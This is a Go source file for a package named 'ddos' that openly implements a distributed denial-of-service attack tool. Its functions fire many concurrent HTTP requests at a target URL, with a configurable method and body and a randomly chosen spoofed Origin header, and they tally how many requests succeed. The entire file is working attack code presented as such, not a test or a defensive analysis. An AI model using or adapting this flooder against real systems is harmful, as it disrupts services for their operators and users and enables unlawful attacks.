package ddos

import (
	"bytes"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"sync"
	"sync/atomic"
	"time"
)

// DDoS - structure of value for DDoS attack
type DDoS struct {
	url           string
	stop          *chan bool
	amountWorkers int

	// Statistic
	successRequest    int64
	amountRequests    int64
	successRequest200 int64
	method            string
	body              string
	origins           []string
}

// New - initialization of new DDoS attack
func New(URL string, workers int, method, body string, origins []string) (*DDoS, error) {
	if workers < 1 {
		return nil, fmt.Errorf("amount of workers cannot be less 1")
	}
	u, err := url.Parse(URL)
	if err != nil || len(u.Host) == 0 {
		return nil, fmt.Errorf("undefined host or error = %v", err)
	}
	s := make(chan bool)
	return &DDoS{
		url:               URL,
		stop:              &s,
		amountWorkers:     workers,
		method:            method,
		body:              body,
		successRequest:    0,
		amountRequests:    0,
		successRequest200: 0,
		origins:           origins,
	}, nil
}
func fetchURL(wg *sync.WaitGroup, d *DDoS) ([]byte, error) {
	defer wg.Done()
	var req *http.Request
	var err error

	if d.method == "GET" || d.method == "DELETE" {
		req, err = http.NewRequest(d.method, d.url, nil)
	} else {
		req, err = http.NewRequest(d.method, d.url, bytes.NewBuffer([]byte(d.body)))
		req.Header.Set("Content-Type", "application/json")
	}
	origin := d.origins[rand.Intn(len(d.origins))]
	req.Header.Set("Origin", origin)

	if err != nil {
		return nil, err
	}

	client := &http.Client{}
	atomic.AddInt64(&d.amountRequests, 1)
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode == 200 || resp.StatusCode == 201 {
		atomic.AddInt64(&d.successRequest200, 1)
	}
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	atomic.AddInt64(&d.successRequest, 1)
	return respBody, nil
}

// Run - run DDoS attack
func (d *DDoS) Run() {
	rand.Seed(time.Now().UnixNano())
	var wg sync.WaitGroup

	for i := 0; i < d.amountWorkers; i++ {
		wg.Add(1)
		go fetchURL(&wg, d)
	}
	wg.Wait()
}

// Result - result of DDoS attack
func (d DDoS) Result() (successRequest, amountRequests int64) {
	fmt.Printf("\n===============\nsuccessRequest :{%v} \namountRequests :{%v}\nsuccessRequest200 :{%d}", d.successRequest, d.amountRequests, d.successRequest200)
	return d.successRequest, d.amountRequests
}
